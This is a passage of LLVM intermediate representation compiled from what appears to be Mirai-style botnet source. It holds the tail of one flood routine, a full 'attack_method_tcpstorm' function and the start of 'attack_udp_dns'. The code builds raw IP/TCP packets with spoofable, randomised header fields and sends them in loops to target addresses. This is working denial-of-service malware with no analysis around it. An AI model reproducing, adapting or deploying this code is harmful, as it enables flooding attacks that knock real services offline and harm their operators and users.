  store i16 %248, i16* %250, align 2
  br label %251

; <label>:251:                                    ; preds = %246, %245
  %252 = getelementptr inbounds i8, i8* %194, i64 10
  %253 = bitcast i8* %252 to i16*
  store i16 0, i16* %253, align 2
  %254 = bitcast i8* %194 to i16*
  %255 = call zeroext i16 @checksum_generic(i16* %254, i32 20) #7
  store i16 %255, i16* %253, align 2
  %256 = getelementptr inbounds i8, i8* %194, i64 36
  %257 = bitcast i8* %256 to i16*
  store i16 0, i16* %257, align 4
  %258 = call zeroext i16 @htons(i16 zeroext 40) #8
  %259 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %195, i8* nonnull %196, i16 zeroext %258, i32 40) #7
  store i16 %259, i16* %257, align 4
  %260 = getelementptr inbounds i8, i8* %194, i64 22
  %261 = bitcast i8* %260 to i16*
  %262 = load i16, i16* %261, align 2
  %263 = load i32, i32* %5, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %264, i32 0, i32 1
  store i16 %262, i16* %265, align 2
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %264, i32 0
  %267 = bitcast %struct.sockaddr_in* %266 to %struct.sockaddr*
  %268 = call i64 @sendto(i32 %37, i8* nonnull %194, i64 60, i32 16384, %struct.sockaddr* %267, i32 16) #7
  %269 = load i32, i32* %5, align 4
  %270 = add nsw i32 %269, 1
  store i32 %270, i32* %5, align 4
  %271 = icmp slt i32 %270, %43
  br i1 %271, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %328
  %storemerge122129 = phi i32 [ %347, %328 ], [ 0, %.lr.ph.split.preheader ]
  %272 = sext i32 %storemerge122129 to i64
  %273 = getelementptr inbounds i8*, i8** %8, i64 %272
  %274 = load i8*, i8** %273, align 8
  %275 = bitcast i8* %274 to %struct.iphdr*
  %276 = getelementptr inbounds i8, i8* %274, i64 20
  %277 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 2
  %278 = load i8, i8* %277, align 4
  %279 = icmp ult i8 %278, 32
  br i1 %279, label %280, label %295

; <label>:280:                                    ; preds = %.lr.ph.split
  %281 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 1
  %282 = load i32, i32* %281, align 4
  %283 = call i32 @ntohl(i32 %282) #8
  %284 = call i32 @rand_next() #7
  %285 = load i32, i32* %5, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %286, i32 2
  %288 = load i8, i8* %287, align 4
  %289 = zext i8 %288 to i32
  %290 = lshr i32 %284, %289
  %291 = add i32 %290, %283
  %292 = call i32 @htonl(i32 %291) #8
  %293 = getelementptr inbounds i8, i8* %274, i64 16
  %294 = bitcast i8* %293 to i32*
  store i32 %292, i32* %294, align 4
  br label %295

; <label>:295:                                    ; preds = %.lr.ph.split, %280
  br i1 %125, label %296, label %301

; <label>:296:                                    ; preds = %295
  %297 = call i32 @rand_next() #7
  %298 = trunc i32 %297 to i16
  %299 = getelementptr inbounds i8, i8* %274, i64 4
  %300 = bitcast i8* %299 to i16*
  store i16 %298, i16* %300, align 4
  br label %301

; <label>:301:                                    ; preds = %296, %295
  br i1 %127, label %302, label %306

; <label>:302:                                    ; preds = %301
  %303 = call i32 @rand_next() #7
  %304 = trunc i32 %303 to i16
  %305 = bitcast i8* %276 to i16*
  store i16 %304, i16* %305, align 4
  br label %306

; <label>:306:                                    ; preds = %302, %301
  br i1 %129, label %307, label %312

; <label>:307:                                    ; preds = %306
  %308 = call i32 @rand_next() #7
  %309 = trunc i32 %308 to i16
  %310 = getelementptr inbounds i8, i8* %274, i64 22
  %311 = bitcast i8* %310 to i16*
  store i16 %309, i16* %311, align 2
  br label %312

; <label>:312:                                    ; preds = %307, %306
  br i1 %130, label %313, label %317

; <label>:313:                                    ; preds = %312
  %314 = call i32 @rand_next() #7
  %315 = getelementptr inbounds i8, i8* %274, i64 24
  %316 = bitcast i8* %315 to i32*
  store i32 %314, i32* %316, align 4
  br label %317

; <label>:317:                                    ; preds = %313, %312
  br i1 %131, label %318, label %322

; <label>:318:                                    ; preds = %317
  %319 = call i32 @rand_next() #7
  %320 = getelementptr inbounds i8, i8* %274, i64 28
  %321 = bitcast i8* %320 to i32*
  store i32 %319, i32* %321, align 4
  br label %322

; <label>:322:                                    ; preds = %318, %317
  br i1 %132, label %328, label %323

; <label>:323:                                    ; preds = %322
  %324 = call i32 @rand_next() #7
  %325 = trunc i32 %324 to i16
  %326 = getelementptr inbounds i8, i8* %274, i64 38
  %327 = bitcast i8* %326 to i16*
  store i16 %325, i16* %327, align 2
  br label %328

; <label>:328:                                    ; preds = %322, %323
  %329 = getelementptr inbounds i8, i8* %274, i64 10
  %330 = bitcast i8* %329 to i16*
  store i16 0, i16* %330, align 2
  %331 = bitcast i8* %274 to i16*
  %332 = call zeroext i16 @checksum_generic(i16* %331, i32 20) #7
  store i16 %332, i16* %330, align 2
  %333 = getelementptr inbounds i8, i8* %274, i64 36
  %334 = bitcast i8* %333 to i16*
  store i16 0, i16* %334, align 4
  %335 = call zeroext i16 @htons(i16 zeroext 40) #8
  %336 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %275, i8* %276, i16 zeroext %335, i32 40) #7
  store i16 %336, i16* %334, align 4
  %337 = getelementptr inbounds i8, i8* %274, i64 22
  %338 = bitcast i8* %337 to i16*
  %339 = load i16, i16* %338, align 2
  %340 = load i32, i32* %5, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %341, i32 0, i32 1
  store i16 %339, i16* %342, align 2
  %343 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %341, i32 0
  %344 = bitcast %struct.sockaddr_in* %343 to %struct.sockaddr*
  %345 = call i64 @sendto(i32 %37, i8* %274, i64 60, i32 16384, %struct.sockaddr* %344, i32 16) #7
  %346 = load i32, i32* %5, align 4
  %347 = add nsw i32 %346, 1
  store i32 %347, i32* %5, align 4
  %348 = icmp slt i32 %347, %43
  br i1 %348, label %.lr.ph.split, label %.loopexit.loopexit137

; <label>:349:                                    ; preds = %4, %121
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstorm(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %37 = trunc i32 %36 to i8
  %38 = load i32, i32* @LOCAL_ADDR, align 4
  %39 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %38)
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %318, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #7
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %108, label %.preheader124

.preheader124:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.lr.ph126

.lr.ph126:                                        ; preds = %.preheader124
  %48 = trunc i32 %35 to i16
  %49 = add i16 %48, 40
  %50 = icmp eq i8 %16, 0
  %51 = trunc i32 %21 to i16
  %52 = shl i16 %24, 13
  %53 = and i16 %52, 8192
  %54 = shl i16 %26, 12
  %55 = and i16 %54, 4096
  %56 = shl i16 %28, 11
  %57 = and i16 %56, 2048
  %58 = shl i16 %30, 10
  %59 = and i16 %58, 1024
  %60 = shl i16 %32, 9
  %61 = and i16 %60, 512
  %62 = shl i16 %34, 8
  %63 = and i16 %62, 256
  %64 = or i16 %53, %55
  %65 = or i16 %64, %57
  %66 = or i16 %65, %59
  %.masked = or i16 %66, %61
  %67 = or i16 %.masked, %63
  %68 = or i16 %67, 160
  br i1 %50, label %.lr.ph126.split.us.preheader, label %.lr.ph126.split.preheader

.lr.ph126.split.preheader:                        ; preds = %.lr.ph126
  br label %.lr.ph126.split

.lr.ph126.split.us.preheader:                     ; preds = %.lr.ph126
  br label %.lr.ph126.split.us

.lr.ph126.split.us:                               ; preds = %.lr.ph126.split.us.preheader, %.lr.ph126.split.us
  %69 = phi i32 [ %106, %.lr.ph126.split.us ], [ 0, %.lr.ph126.split.us.preheader ]
  %70 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %71 = sext i32 %69 to i64
  %72 = getelementptr inbounds i8*, i8** %8, i64 %71
  store i8* %70, i8** %72, align 8
  %73 = getelementptr inbounds i8, i8* %70, i64 20
  store i8 69, i8* %70, align 4
  %74 = getelementptr inbounds i8, i8* %70, i64 1
  store i8 %10, i8* %74, align 1
  %75 = call zeroext i16 @htons(i16 zeroext %49) #8
  %76 = getelementptr inbounds i8, i8* %70, i64 2
  %77 = bitcast i8* %76 to i16*
  store i16 %75, i16* %77, align 2
  %78 = call zeroext i16 @htons(i16 zeroext %12) #8
  %79 = getelementptr inbounds i8, i8* %70, i64 4
  %80 = bitcast i8* %79 to i16*
  store i16 %78, i16* %80, align 4
  %81 = getelementptr inbounds i8, i8* %70, i64 8
  store i8 %14, i8* %81, align 4
  %82 = getelementptr inbounds i8, i8* %70, i64 9
  store i8 6, i8* %82, align 1
  %83 = getelementptr inbounds i8, i8* %70, i64 12
  %84 = bitcast i8* %83 to i32*
  store i32 %39, i32* %84, align 4
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %71, i32 1
  %86 = load i32, i32* %85, align 4
  %87 = getelementptr inbounds i8, i8* %70, i64 16
  %88 = bitcast i8* %87 to i32*
  store i32 %86, i32* %88, align 4
  %89 = call zeroext i16 @htons(i16 zeroext %18) #8
  %90 = bitcast i8* %73 to i16*
  store i16 %89, i16* %90, align 4
  %91 = call zeroext i16 @htons(i16 zeroext %20) #8
  %92 = getelementptr inbounds i8, i8* %70, i64 22
  %93 = bitcast i8* %92 to i16*
  store i16 %91, i16* %93, align 2
  %94 = call zeroext i16 @htons(i16 zeroext %51) #8
  %95 = zext i16 %94 to i32
  %96 = getelementptr inbounds i8, i8* %70, i64 24
  %97 = bitcast i8* %96 to i32*
  store i32 %95, i32* %97, align 4
  %98 = getelementptr inbounds i8, i8* %70, i64 32
  %99 = bitcast i8* %98 to i16*
  store i16 %68, i16* %99, align 4
  %100 = call i32 @rand() #7
  %101 = srem i32 %100, 65535
  %102 = trunc i32 %101 to i16
  %103 = getelementptr inbounds i8, i8* %70, i64 34
  %104 = bitcast i8* %103 to i16*
  store i16 %102, i16* %104, align 2
  %105 = load i32, i32* %5, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %5, align 4
  %107 = icmp slt i32 %106, %46
  br i1 %107, label %.lr.ph126.split.us, label %.preheader.loopexit

; <label>:108:                                    ; preds = %42
  %109 = call i32 @close(i32 %40) #7
  br label %318

.preheader.loopexit:                              ; preds = %.lr.ph126.split.us
  br label %.preheader

.preheader.loopexit134:                           ; preds = %.lr.ph126.split
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit134, %.preheader.loopexit, %.preheader124
  %110 = icmp eq i32 %39, -1
  %111 = and i32 %11, 65535
  %112 = icmp eq i32 %111, 65535
  %113 = and i32 %17, 65535
  %114 = icmp eq i32 %113, 65535
  %115 = and i32 %19, 65535
  %116 = icmp eq i32 %115, 65535
  %117 = icmp eq i32 %21, 65535
  %118 = icmp eq i32 %22, 65535
  %119 = icmp eq i8 %37, 0
  %120 = sext i32 %35 to i64
  %121 = add nsw i64 %120, 20
  %122 = trunc i64 %121 to i16
  %123 = trunc i64 %121 to i32
  %124 = add nsw i64 %120, 40
  br label %.loopexit

.lr.ph126.split:                                  ; preds = %.lr.ph126.split.preheader, %.lr.ph126.split
  %125 = phi i32 [ %165, %.lr.ph126.split ], [ 0, %.lr.ph126.split.preheader ]
  %126 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %127 = sext i32 %125 to i64
  %128 = getelementptr inbounds i8*, i8** %8, i64 %127
  store i8* %126, i8** %128, align 8
  %129 = getelementptr inbounds i8, i8* %126, i64 20
  store i8 69, i8* %126, align 4
  %130 = getelementptr inbounds i8, i8* %126, i64 1
  store i8 %10, i8* %130, align 1
  %131 = call zeroext i16 @htons(i16 zeroext %49) #8
  %132 = getelementptr inbounds i8, i8* %126, i64 2
  %133 = bitcast i8* %132 to i16*
  store i16 %131, i16* %133, align 2
  %134 = call zeroext i16 @htons(i16 zeroext %12) #8
  %135 = getelementptr inbounds i8, i8* %126, i64 4
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 4
  %137 = getelementptr inbounds i8, i8* %126, i64 8
  store i8 %14, i8* %137, align 4
  %138 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %139 = getelementptr inbounds i8, i8* %126, i64 6
  %140 = bitcast i8* %139 to i16*
  store i16 %138, i16* %140, align 2
  %141 = getelementptr inbounds i8, i8* %126, i64 9
  store i8 6, i8* %141, align 1
  %142 = getelementptr inbounds i8, i8* %126, i64 12
  %143 = bitcast i8* %142 to i32*
  store i32 %39, i32* %143, align 4
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %127, i32 1
  %145 = load i32, i32* %144, align 4
  %146 = getelementptr inbounds i8, i8* %126, i64 16
  %147 = bitcast i8* %146 to i32*
  store i32 %145, i32* %147, align 4
  %148 = call zeroext i16 @htons(i16 zeroext %18) #8
  %149 = bitcast i8* %129 to i16*
  store i16 %148, i16* %149, align 4
  %150 = call zeroext i16 @htons(i16 zeroext %20) #8
  %151 = getelementptr inbounds i8, i8* %126, i64 22
  %152 = bitcast i8* %151 to i16*
  store i16 %150, i16* %152, align 2
  %153 = call zeroext i16 @htons(i16 zeroext %51) #8
  %154 = zext i16 %153 to i32
  %155 = getelementptr inbounds i8, i8* %126, i64 24
  %156 = bitcast i8* %155 to i32*
  store i32 %154, i32* %156, align 4
  %157 = getelementptr inbounds i8, i8* %126, i64 32
  %158 = bitcast i8* %157 to i16*
  store i16 %68, i16* %158, align 4
  %159 = call i32 @rand() #7
  %160 = srem i32 %159, 65535
  %161 = trunc i32 %160 to i16
  %162 = getelementptr inbounds i8, i8* %126, i64 34
  %163 = bitcast i8* %162 to i16*
  store i16 %161, i16* %163, align 2
  %164 = load i32, i32* %5, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %5, align 4
  %166 = icmp slt i32 %165, %46
  br i1 %166, label %.lr.ph126.split, label %.preheader.loopexit134

.loopexit.loopexit:                               ; preds = %223
  br label %.loopexit.backedge

.loopexit.loopexit133:                            ; preds = %297
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit133
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %110, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %223
  %storemerge117125.us = phi i32 [ %242, %223 ], [ 0, %.lr.ph.split.us.preheader ]
  %167 = sext i32 %storemerge117125.us to i64
  %168 = getelementptr inbounds i8*, i8** %8, i64 %167
  %169 = load i8*, i8** %168, align 8
  %170 = bitcast i8* %169 to %struct.iphdr*
  %171 = getelementptr inbounds i8, i8* %169, i64 20
  %172 = getelementptr inbounds i8, i8* %169, i64 40
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 2
  %174 = load i8, i8* %173, align 4
  %175 = icmp ult i8 %174, 32
  br i1 %175, label %176, label %191

; <label>:176:                                    ; preds = %.lr.ph.split.us
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #8
  %180 = call i32 @rand_next() #7
  %181 = load i32, i32* %5, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %182, i32 2
  %184 = load i8, i8* %183, align 4
  %185 = zext i8 %184 to i32
  %186 = lshr i32 %180, %185
  %187 = add i32 %186, %179
  %188 = call i32 @htonl(i32 %187) #8
  %189 = getelementptr inbounds i8, i8* %169, i64 16
  %190 = bitcast i8* %189 to i32*
  store i32 %188, i32* %190, align 4
  br label %191

; <label>:191:                                    ; preds = %.lr.ph.split.us, %176
  %192 = call i32 @rand_next() #7
  %193 = getelementptr inbounds i8, i8* %169, i64 12
  %194 = bitcast i8* %193 to i32*
  store i32 %192, i32* %194, align 4
  br i1 %112, label %195, label %200

; <label>:195:                                    ; preds = %191
  %196 = call i32 @rand_next() #7
  %197 = trunc i32 %196 to i16
  %198 = getelementptr inbounds i8, i8* %169, i64 4
  %199 = bitcast i8* %198 to i16*
  store i16 %197, i16* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %195, %191
  br i1 %114, label %201, label %205

; <label>:201:                                    ; preds = %200
  %202 = call i32 @rand_next() #7
  %203 = trunc i32 %202 to i16
  %204 = bitcast i8* %171 to i16*
  store i16 %203, i16* %204, align 4
  br label %205

; <label>:205:                                    ; preds = %201, %200
  br i1 %116, label %206, label %211

; <label>:206:                                    ; preds = %205
  %207 = call i32 @rand_next() #7
  %208 = trunc i32 %207 to i16
  %209 = getelementptr inbounds i8, i8* %169, i64 22
  %210 = bitcast i8* %209 to i16*
  store i16 %208, i16* %210, align 2
  br label %211

; <label>:211:                                    ; preds = %206, %205
  br i1 %117, label %212, label %216

; <label>:212:                                    ; preds = %211
  %213 = call i32 @rand_next() #7
  %214 = getelementptr inbounds i8, i8* %169, i64 24
  %215 = bitcast i8* %214 to i32*
  store i32 %213, i32* %215, align 4
  br label %216

; <label>:216:                                    ; preds = %212, %211
  br i1 %118, label %217, label %221

; <label>:217:                                    ; preds = %216
  %218 = call i32 @rand_next() #7
  %219 = getelementptr inbounds i8, i8* %169, i64 28
  %220 = bitcast i8* %219 to i32*
  store i32 %218, i32* %220, align 4
  br label %221

; <label>:221:                                    ; preds = %217, %216
  br i1 %119, label %223, label %222

; <label>:222:                                    ; preds = %221
  call void @rand_str(i8* nonnull %172, i32 %35) #7
  br label %223

; <label>:223:                                    ; preds = %222, %221
  %224 = getelementptr inbounds i8, i8* %169, i64 10
  %225 = bitcast i8* %224 to i16*
  store i16 0, i16* %225, align 2
  %226 = bitcast i8* %169 to i16*
  %227 = call zeroext i16 @checksum_generic(i16* %226, i32 20) #7
  store i16 %227, i16* %225, align 2
  %228 = getelementptr inbounds i8, i8* %169, i64 36
  %229 = bitcast i8* %228 to i16*
  store i16 0, i16* %229, align 4
  %230 = call zeroext i16 @htons(i16 zeroext %122) #8
  %231 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %170, i8* nonnull %171, i16 zeroext %230, i32 %123) #7
  store i16 %231, i16* %229, align 4
  %232 = getelementptr inbounds i8, i8* %169, i64 22
  %233 = bitcast i8* %232 to i16*
  %234 = load i16, i16* %233, align 2
  %235 = load i32, i32* %5, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %236, i32 0, i32 1
  store i16 %234, i16* %237, align 2
  %238 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %236, i32 0
  %239 = bitcast %struct.sockaddr_in* %238 to %struct.sockaddr*
  %240 = call i64 @sendto(i32 %40, i8* nonnull %169, i64 %124, i32 16384, %struct.sockaddr* %239, i32 16) #7
  %241 = load i32, i32* %5, align 4
  %242 = add nsw i32 %241, 1
  store i32 %242, i32* %5, align 4
  %243 = icmp slt i32 %242, %46
  br i1 %243, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %297
  %storemerge117125 = phi i32 [ %316, %297 ], [ 0, %.lr.ph.split.preheader ]
  %244 = sext i32 %storemerge117125 to i64
  %245 = getelementptr inbounds i8*, i8** %8, i64 %244
  %246 = load i8*, i8** %245, align 8
  %247 = bitcast i8* %246 to %struct.iphdr*
  %248 = getelementptr inbounds i8, i8* %246, i64 20
  %249 = getelementptr inbounds i8, i8* %246, i64 40
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %244, i32 2
  %251 = load i8, i8* %250, align 4
  %252 = icmp ult i8 %251, 32
  br i1 %252, label %253, label %268

; <label>:253:                                    ; preds = %.lr.ph.split
  %254 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %244, i32 1
  %255 = load i32, i32* %254, align 4
  %256 = call i32 @ntohl(i32 %255) #8
  %257 = call i32 @rand_next() #7
  %258 = load i32, i32* %5, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %259, i32 2
  %261 = load i8, i8* %260, align 4
  %262 = zext i8 %261 to i32
  %263 = lshr i32 %257, %262
  %264 = add i32 %263, %256
  %265 = call i32 @htonl(i32 %264) #8
  %266 = getelementptr inbounds i8, i8* %246, i64 16
  %267 = bitcast i8* %266 to i32*
  store i32 %265, i32* %267, align 4
  br label %268

; <label>:268:                                    ; preds = %.lr.ph.split, %253
  br i1 %112, label %269, label %274

; <label>:269:                                    ; preds = %268
  %270 = call i32 @rand_next() #7
  %271 = trunc i32 %270 to i16
  %272 = getelementptr inbounds i8, i8* %246, i64 4
  %273 = bitcast i8* %272 to i16*
  store i16 %271, i16* %273, align 4
  br label %274

; <label>:274:                                    ; preds = %269, %268
  br i1 %114, label %275, label %279

; <label>:275:                                    ; preds = %274
  %276 = call i32 @rand_next() #7
  %277 = trunc i32 %276 to i16
  %278 = bitcast i8* %248 to i16*
  store i16 %277, i16* %278, align 4
  br label %279

; <label>:279:                                    ; preds = %275, %274
  br i1 %116, label %280, label %285

; <label>:280:                                    ; preds = %279
  %281 = call i32 @rand_next() #7
  %282 = trunc i32 %281 to i16
  %283 = getelementptr inbounds i8, i8* %246, i64 22
  %284 = bitcast i8* %283 to i16*
  store i16 %282, i16* %284, align 2
  br label %285

; <label>:285:                                    ; preds = %280, %279
  br i1 %117, label %286, label %290

; <label>:286:                                    ; preds = %285
  %287 = call i32 @rand_next() #7
  %288 = getelementptr inbounds i8, i8* %246, i64 24
  %289 = bitcast i8* %288 to i32*
  store i32 %287, i32* %289, align 4
  br label %290

; <label>:290:                                    ; preds = %286, %285
  br i1 %118, label %291, label %295

; <label>:291:                                    ; preds = %290
  %292 = call i32 @rand_next() #7
  %293 = getelementptr inbounds i8, i8* %246, i64 28
  %294 = bitcast i8* %293 to i32*
  store i32 %292, i32* %294, align 4
  br label %295

; <label>:295:                                    ; preds = %291, %290
  br i1 %119, label %297, label %296

; <label>:296:                                    ; preds = %295
  call void @rand_str(i8* %249, i32 %35) #7
  br label %297

; <label>:297:                                    ; preds = %295, %296
  %298 = getelementptr inbounds i8, i8* %246, i64 10
  %299 = bitcast i8* %298 to i16*
  store i16 0, i16* %299, align 2
  %300 = bitcast i8* %246 to i16*
  %301 = call zeroext i16 @checksum_generic(i16* %300, i32 20) #7
  store i16 %301, i16* %299, align 2
  %302 = getelementptr inbounds i8, i8* %246, i64 36
  %303 = bitcast i8* %302 to i16*
  store i16 0, i16* %303, align 4
  %304 = call zeroext i16 @htons(i16 zeroext %122) #8
  %305 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %247, i8* %248, i16 zeroext %304, i32 %123) #7
  store i16 %305, i16* %303, align 4
  %306 = getelementptr inbounds i8, i8* %246, i64 22
  %307 = bitcast i8* %306 to i16*
  %308 = load i16, i16* %307, align 2
  %309 = load i32, i32* %5, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %310, i32 0, i32 1
  store i16 %308, i16* %311, align 2
  %312 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %310, i32 0
  %313 = bitcast %struct.sockaddr_in* %312 to %struct.sockaddr*
  %314 = call i64 @sendto(i32 %40, i8* %246, i64 %124, i32 16384, %struct.sockaddr* %313, i32 16) #7
  %315 = load i32, i32* %5, align 4
  %316 = add nsw i32 %315, 1
  store i32 %316, i32* %5, align 4
  %317 = icmp slt i32 %316, %46
  br i1 %317, label %.lr.ph.split, label %.loopexit.loopexit133

; <label>:318:                                    ; preds = %4, %108
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %7 = trunc i32 %6 to i8
  %8 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %9 = trunc i32 %8 to i16
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %13 = trunc i32 %12 to i8
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %15 = trunc i32 %14 to i16
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 53)
  %17 = trunc i32 %16 to i16
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 9, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %21 = trunc i32 %20 to i8
  %22 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %23 = tail call fastcc i32 @get_dns_resolver()
  %24 = icmp eq i8* %22, null
  br i1 %24, label %291, label %25

; <label>:25:                                     ; preds = %4
  %26 = tail call i32 @util_strlen(i8* nonnull %22) #7
  %27 = tail call i32 @socket(i32 2, i32 3, i32 17) #7
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %291, label %29

; <label>:29:                                     ; preds = %25
  store i32 1, i32* %5, align 4
  %30 = bitcast i32* %5 to i8*
  %31 = call i32 @setsockopt(i32 %27, i32 0, i32 3, i8* nonnull %30, i32 4) #7
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %110, label %.preheader121

.preheader121:                                    ; preds = %29
  store i32 0, i32* %5, align 4
  %33 = zext i8 %0 to i32
  %34 = icmp eq i8 %0, 0
  %.pre = and i32 %20, 255
  br i1 %34, label %.preheader121..preheader_crit_edge, label %.lr.ph128

